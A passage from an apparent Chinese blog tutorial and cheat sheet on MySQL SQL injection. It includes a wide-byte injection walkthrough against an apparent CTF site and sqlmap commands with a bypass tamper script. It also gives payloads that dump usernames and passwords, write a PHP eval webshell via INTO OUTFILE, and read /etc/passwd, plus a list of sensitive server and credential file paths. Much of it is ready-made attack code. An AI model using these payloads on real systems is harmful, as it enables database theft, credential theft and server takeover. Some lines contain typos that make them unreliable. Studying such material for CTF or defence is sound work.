中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p>\n<blockquote>\n<p>我们需要记住该表中记录数据库库名、表名和字段名的字段名为 TABLE_SCHEMA、TABLE_NAME 和 COLUMN_NAME。</p>\n</blockquote>\n<h1 id=\"常用的关于information_schema库的sql语句\"><a class=\"anchor\" href=\"#常用的关于information_schema库的sql语句\">#</a> 常用的关于 information_schema 库的 SQL 语句</h1>\n<p>需要记住的几个函数</p>\n<ul>\n<li>database ()：当前网站使用的数据库</li>\n<li>version ()：当前 MySQL 的版本</li>\n<li>user ()：当前 MySQL 的用户</li>\n</ul>\n<p>limit 的用法<br />\n limit m,n 其中 m 是指记录开始的位置，从 0 开始，表示第一条记录；n 是指取 n 条记录。</p>\n<h2 id=\"查询数据表\"><a class=\"anchor\" href=\"#查询数据表\">#</a> 查询数据表</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> table_name from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>mysql 的联合查询会把所有的查询结果返回到第一个查询的字段下，在注入过程中常让第一个查询结果错误，这样就只显示你联合查询的结果了</p>\n<h2 id=\"查询字段\"><a class=\"anchor\" href=\"#查询字段\">#</a> 查询字段</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span>,3,4 from information_schema.columns where <span class=\"token assign-left variable\">table_name</span><span class=\"token operator\">=</span><span class=\"token string\">'你查询出来的表名'</span></pre></td></tr></table></figure><h2 id=\"一句话总结\"><a class=\"anchor\" href=\"#一句话总结\">#</a> 一句话总结</h2>\n<p><em><strong>查询数据表与表字段的时候会用到 information_schema 库</strong></em></p>\n<h1 id=\"sql注入的基本流程\"><a class=\"anchor\" href=\"#sql注入的基本流程\">#</a> SQL 注入的基本流程</h1>\n<h2 id=\"判断是否存在注入点\"><a class=\"anchor\" href=\"#判断是否存在注入点\">#</a> 判断是否存在注入点</h2>\n<h2 id=\"判断注入类型\"><a class=\"anchor\" href=\"#判断注入类型\">#</a> 判断注入类型</h2>\n<h2 id=\"猜字段数量\"><a class=\"anchor\" href=\"#猜字段数量\">#</a> 猜字段数量</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>order by <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>后面加数字是对查询的第几列排序，从而实现判断字段的个数的目的</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>迭代1~n,直到页面出错（也就是数据库报错了，里面没有这一列。）</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>order by <span class=\"token number\">5</span>  页面正常</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>order by <span class=\"token number\">6</span>  页面错误</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>共有6个字段</pre></td></tr></table></figure><h2 id=\"看看哪个字段回显\"><a class=\"anchor\" href=\"#看看哪个字段回显\">#</a> 看看哪个字段回显</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> <span class=\"token number\">1,2</span>,3,4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>看回显什么数字，就可以知道那个字段回显。</pre></td></tr></table></figure><h2 id=\"查询数据库名版本用户\"><a class=\"anchor\" href=\"#查询数据库名版本用户\">#</a> 查询数据库名，版本，用户</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>,3,4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>.version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>.user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">..</span></pre></td></tr></table></figure><h2 id=\"查询数据表-2\"><a class=\"anchor\" href=\"#查询数据表-2\">#</a> 查询数据表</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> table_name from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"查询字段-2\"><a class=\"anchor\" href=\"#查询字段-2\">#</a> 查询字段</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span>,3,4 from information_schema.columns where <span class=\"token assign-left variable\">table_name</span><span class=\"token operator\">=</span><span class=\"token string\">'你查询出来的表名'</span></pre></td></tr></table></figure><h2 id=\"查询数据\"><a class=\"anchor\" href=\"#查询数据\">#</a> 查询数据</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>union selcet <span class=\"token number\">1</span>,group_concat<span class=\"token punctuation\">(</span>要查询的字段1,字段2,<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>字段n<span class=\"token punctuation\">)</span>,3,4 from 数据表<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,<span class=\"token punctuation\">(</span>select group_concat<span class=\"token punctuation\">(</span>字段<span class=\"token punctuation\">)</span> from 数据表<span class=\"token punctuation\">)</span>,3,4<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"宽字节注入\"><a class=\"anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h1>\n<h2 id=\"宽字节注入产生的原因\"><a class=\"anchor\" href=\"#宽字节注入产生的原因\">#</a> 宽字节注入产生的原因</h2>\n<p>宽字节注入就是用一个大于 128 的十六进制数来吃掉转义符 ```</p>\n<p>gbk 编码，用两个字节作为一个字符的编码.</p>\n<h2 id=\"宽字节注入的手工注入流程\"><a class=\"anchor\" href=\"#宽字节注入的手工注入流程\">#</a> 宽字节注入的手工注入流程</h2>\n<p>1、判断列数：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 1%23<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 2%23<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 3%23<br />\norder by 3 时报错，说明只有两列。</p>\n<p>2、各类信息：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,(concat_ws(char(32,58,32),user(),database(),version()))%23<br />\n<span class=\"exturl\" data-url=\"bWFpbHRvOnNhZS1jaGluYWxvdmVyQDEyMy4xMjUuMjMuMjEy\">sae-chinalover@123.125.23.212</span> : sae-chinalover : 5.5.52-0ubuntu0.14.04.1</p>\n<p>3、库名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2 union select 2,database()%23<br />\nsae-chinalover</p>\n<p>4、表名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,group_concat(table_name)<br />\nfrom information_schema.tables<br />\nwhere table_schema=database()%23<br />\nctf,ctf2,ctf3,ctf4,news</p>\n<p>5、ctf4 表的列名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,group_concat(column_name)<br />\nfrom information_schema.columns<br />\nwhere table_name=0x63746634%23<br />\nid,flag</p>\n<p>这里注意：要将表名 ctf4 转为 16 进制</p>\n<p>这里提供一个字符串转 16 进制的网站：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy41aXh1ZXhpd2FuZy5jb20vc3RyL2hleC5waHA=\">http://www.5ixuexiwang.com/str/hex.php</span></p>\n<p>转了 16 进制之后记得在前面加上 0x</p>\n<p this_is_sqli_flag=\"\">6、flag 列的数据：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,(select flag from ctf4)%23<br />\nflag</p>\n<h2 id=\"使用sqlmap进行宽字节注入\"><a class=\"anchor\" href=\"#使用sqlmap进行宽字节注入\">#</a> 使用 SQLmap 进行宽字节注入</h2>\n<p>sqlmap 跑法<br />\n 1、查看有哪些库：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes --dbs<br />\n 这个时侯就要用到一个脚本了：</p>\n<p>脚本名：<span class=\"exturl\" data-url=\"aHR0cDovL3VubWFnaWNxdW90ZXMucHk=\">unmagicquotes.py</span></p>\n<p>作用：宽字符绕过</p>\n<p>2、表名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D  <code>sae-chinalover</code>  --tables</p>\n<p>3、列名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D  <code>sae-chinalover</code>  -T ctf4 --columns</p>\n<p>4、flag 列的数据：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D  <code>sae-chinalover</code>  -T ctf4 -C flag</p>\n<h1 id=\"常用姿势\"><a class=\"anchor\" href=\"#常用姿势\">#</a> 常用姿势</h1>\n<h2 id=\"判断是否存在sql注入\"><a class=\"anchor\" href=\"#判断是否存在sql注入\">#</a> 判断是否存在 SQL 注入</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>and <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>and <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>'</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\"</pre></td></tr></table></figure><h2 id=\"暴字段长度\"><a class=\"anchor\" href=\"#暴字段长度\">#</a> 暴字段长度</h2>\n<p>Order by 数字</p>\n<h2 id=\"匹配字段\"><a class=\"anchor\" href=\"#匹配字段\">#</a> 匹配字段</h2>\n<p>and 1=1 union select 1,2,…,n</p>\n<h2 id=\"暴字段位置回显位\"><a class=\"anchor\" href=\"#暴字段位置回显位\">#</a> 暴字段位置（回显位）</h2>\n<p>and 1=2 union select 1,2,…,n</p>\n<h2 id=\"利用内置函数暴数据库信息\"><a class=\"anchor\" href=\"#利用内置函数暴数据库信息\">#</a> 利用内置函数暴数据库信息</h2>\n<p>version() database() user()</p>\n<h2 id=\"不用猜解可用字段暴数据库信息有些网站不适用\"><a class=\"anchor\" href=\"#不用猜解可用字段暴数据库信息有些网站不适用\">#</a> 不用猜解可用字段暴数据库信息 (有些网站不适用):</h2>\n<p>and 1=2 union all select version()<br />\nand 1=2 union all select database()<br />\nand 1=2 union all select user()</p>\n<h2 id=\"操作系统信息\"><a class=\"anchor\" href=\"#操作系统信息\">#</a> 操作系统信息：</h2>\n<p>and 1=2 union all select @@global.version_compile_os from mysql.user</p>\n<h2 id=\"数据库权限\"><a class=\"anchor\" href=\"#数据库权限\">#</a> 数据库权限：</h2>\n<p>and ord (mid (user (),1,1))=114 返回正常说明为 root</p>\n<h2 id=\"暴库-mysql50\"><a class=\"anchor\" href=\"#暴库-mysql50\">#</a> 暴库 (mysql&gt;5.0)</h2>\n<p>Mysql 5 以上有内置库 information_schema，存储着 mysql 的所有数据库和<br />\n表结构信息</p>\n<p>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from<br />\ninformation_schema.SCHEMATA limit 0,1</p>\n<h2 id=\"猜表\"><a class=\"anchor\" href=\"#猜表\">#</a> 猜表</h2>\n<p>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from<br />\ninformation_schema.TABLES where TABLE_SCHEMA = 数据库（十六进制） limit 0（开始的记录，0 为第一个开始记录）,1（显示 1 条记录）—</p>\n<h2 id=\"猜字段\"><a class=\"anchor\" href=\"#猜字段\">#</a> 猜字段</h2>\n<p>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from<br />\ninformation_schema.COLUMNS where TABLE_NAME = 表名（十六进制）limit 0,1</p>\n<h2 id=\"暴密码\"><a class=\"anchor\" href=\"#暴密码\">#</a> 暴密码</h2>\n<p>and 1=2 Union select 1,2,3, 用户名段，5,6,7, 密码段，8,9 from 表名 limit 0,1 高级用法（一个可用字段显示两个数据内容）：<br />\nUnion select 1,2,3concat (用户名段，0x3c, 密码段),5,6,7,8,9 from 表名 limit 0,1</p>\n<h2 id=\"直接写马root权限\"><a class=\"anchor\" href=\"#直接写马root权限\">#</a> 直接写马 (Root 权限)</h2>\n<p>条件：<br />\n1、知道站点物理路径<br />\n 2、有足够大的权限（可以用 select …. from mysql.user 测试）<br />\n3、magic_quotes_gpc()=OFF<br />\nselect ‘<?php eval_r($_POST[cmd])?>’ into outfile ‘物理路径’<br />\nand 1=2 union all select 一句话 HEX 值 into outfile ‘路径’</p>\n<h2 id=\"文件读写\"><a class=\"anchor\" href=\"#文件读写\">#</a> 文件读写</h2>\n<p>即通过数据库来读写服务器上的文件</p>\n<p>LOAD_FILE(file_name)</p>\n<p>其中 file_name 是文件的完整路径。</p>\n<p>示例:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'D:/wamp64/tmp/1.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+----------------------------------+</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">|</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'D:/wamp64/tmp/1.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+----------------------------------+</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">666</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+----------------------------------+</pre></td></tr></table></figure><p>select …… into outfile</p>\n<p>outfile 函数可以导出多行，而 dumpfile 只能导出一行数据<br />\n outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式<br />\n outfile 函数会在写入的文件最后加一个换行，即多写一行</p>\n<p>实例：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token string\">'a<span class=\"token entity\" title=\"\\n\">\\n</span>aa<span class=\"token entity\" title=\"\\r\">\\r</span>aaaa'</span> into outfile <span class=\"token string\">'d:/test1.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Query OK, <span class=\"token number\">1</span> row affected <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test1.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">|</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test1.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> a<span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>aaaa</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>               <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">1</span> row <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token string\">'a<span class=\"token entity\" title=\"\\n\">\\n</span>aa<span class=\"token entity\" title=\"\\r\">\\r</span>aaaa'</span> into dumpfile <span class=\"token string\">'d:/test.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Query OK, <span class=\"token number\">1</span> row affected <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test.txt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    -<span class=\"token operator\">></span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">|</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">|</span> a</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>aaaa                <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token number\">1</span> row <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有一个需要关注的点就是：outfile 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径。这个问题在 php 注入中更加麻烦，因为会自动将单引号转义成 ', 那么基本就 GG 了，但是 load_file，后面的路径可以是单引号、0x、char 转换的字符，但是路径中的斜杠是 / 而不是 \\</p>\n<h3 id=\"mysql新特性secure_file_priv对读写文件的影响\"><a class=\"anchor\" href=\"#mysql新特性secure_file_priv对读写文件的影响\">#</a> MYSQL 新特性 secure_file_priv 对读写文件的影响</h3>\n<p>secure-file-priv 特性<br />\n secure-file-priv 参数是用来限制 LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE () 传到哪个指定目录的。</p>\n<font color=\"red\">\n<ul>\n<li>\n<p>secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入 | 导出</p>\n</li>\n<li>\n<p>当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下</p>\n</li>\n<li>\n<p>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制</p>\n</li>\n</ul>\n</font>\n<p>如何查看 secure-file-priv 参数的值：</p>\n<p><code>show global variables like '%secure%';</code></p>\n<pre><code>+--------------------------+------+\n| Variable_name            | Value|\n+--------------------------+------+\n| require_secure_transport | OFF  |\n| secure_auth              | ON   |\n| secure_file_priv         | NULL |\n+--------------------------+------+\n</code></pre>\n<p>修改 secure_file_priv 的值:<br />\nwindows 下：修改 my.ini 在 [mysqld] 内加入 secure_file_priv =<br />\nlinux 下：修改 my.cnf 在 [mysqld] 内加入 secure_file_priv =<br />\n 然后重启 mysql，再查询 secure_file_priv</p>\n<h3 id=\"load_file-常用路径\"><a class=\"anchor\" href=\"#load_file-常用路径\">#</a> load_file () 常用路径：</h3>\n<p>1、 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)<br />\n2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>\n<p>上面两个是查看一个 PHP 文件里完全显示代码。有些时候不替换一些字符，如 “&lt;” 替换成” 空格” 返回的是网页。而无法查看到代码.</p>\n<p>3、 load_file (char (47)) 可以列出 FreeBSD,Sunos 系统根目录<br />\n 4、/etc tpd/conf tpd.conf 或 /usr/local/apche/conf tpd.conf 查看 linux APACHE 虚拟主机配置文件<br />\n 5、c:\\Program Files\\Apache Group\\Apache\\conf \\httpd.conf 或 C:\\apache\\conf \\httpd.conf 查看 WINDOWS 系统 apache 文件<br />\n 6、c:/Resin-3.0.14/conf/resin.conf 查看 jsp 开发的网站 resin 文件配置信息.<br />\n7、c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看 linux 系统配置的 JSP 虚拟主机<br />\n 8、d:\\APACHE\\Apache2\\conf\\httpd.conf<br />\n9、C:\\Program Files\\mysql\\my.ini<br />\n10、…/themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径<br />\n 11、 c:\\windows\\system32\\inetsrv\\MetaBase.xml 查看 IIS 的虚拟主机配置文件<br />\n 12、 /usr/local/resin-3.0.22/conf/resin.conf 针对 3.0.22 的 RESIN 配置文件查看<br />\n 13、 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上<br />\n 14 、/usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE 虚拟主机查看<br />\n 15、 /etc/sysconfig/iptables 本看防火墙策略<br />\n 16 、 usr/local/app/php5 b/php.ini PHP 的相当设置<br />\n 17 、/etc/my.cnf MYSQL 的配置文件<br />\n 18、 /etc/redhat-release 红帽子的系统版本<br />\n 19 、C:\\mysql\\data\\mysql\\user.MYD 存在 MYSQL 系统中的用户密码<br />\n 20、/etc/sysconfig/network-scripts/ifcfg-eth0 查看 IP.<br />\n21、/usr/local/app/php5 b/php.ini//PHP 相关设置<br />\n 22、/usr/local/app/apache2/conf/extra tpd-vhosts.conf// 虚拟网站设置<br />\n 23、C:\\Program Files\\<span class=\"exturl\" data-url=\"aHR0cDovL1JoaW5vU29mdC5jb20=\">RhinoSoft.com</span>\\Serv-U\\ServUDaemon.ini<br />\n24、c:\\windows\\my.ini<br />\n25、c:\\boot.ini</p>\n<h2 id=\"网站常用配置文件\"><a class=\"anchor\" href=\"#网站常用配置文件\">#</a> 网站常用配置文件</h2>\n<p>config.inc.php、config.php。</p>\n<p>load_file（）时要用 replace（load_file (HEX)，char (60),char (32)）<br />\n注：<br />\nChar (60) 表示 &lt;<br />\nChar（32）表示 空格</p>\n<h2 id=\"手工注射时出现的问题\"><a class=\"anchor\" href=\"#手工注射时出现的问题\">#</a> 手工注射时出现的问题：</h2>\n<p>当注射后页面显示：<br />\nIllegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation ‘UNION’<br />\n如：/instrument.php?ID=13 and 1=2 union select 1,load_file (0x433A5C626F6F742E696E69),3,4,user ()<br />\n 这是由于前后编码不一致造成的，<br />\n解决方法：在参数前加上 unhex (hex (参数)) 就可以了。上面的 URL 就可以改为：<br />\n/instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))</p>\n<h1 id=\"常见函数\"><a class=\"anchor\" href=\"#常见函数\">#</a> 常见函数</h1>\n<font color=\"DeepSkyBlue\">\n<h2 id=\"length\"><a class=\"anchor\" href=\"#length\">#</a> length()</h2>\n<p>MySQL LENGTH (str) 函数的返回值为字符串的字节长度，使用 uft8（UNICODE 的一种变长字符编码，又称万国码）编码字符集时，一个汉字是 3 个字节，一个数字或字母是一个字节。</p>\n<p>【实例】使用 LENGTH 函数计算字符串长度，输入的 SQL 语句和执行结果如下所示。</p>\n<pre><code>mysql&gt; SELECT LENGTH('name'),LENGTH('数据库');\n+----------------+---------------------+\n|LENGTH('name')  | LENGTH('数据库')    |\n+----------------+---------------------+\n|              4 |                   9 |\n+----------------+---------------------+\n1 row in set (0.04 sec)\n</code></pre>\n<p>由运行结果可以看到，一个汉字是 3 个字节，“数据库” 字符串占 9 个字节。英文字符的个数和所占的字节相同，一个字符占 1 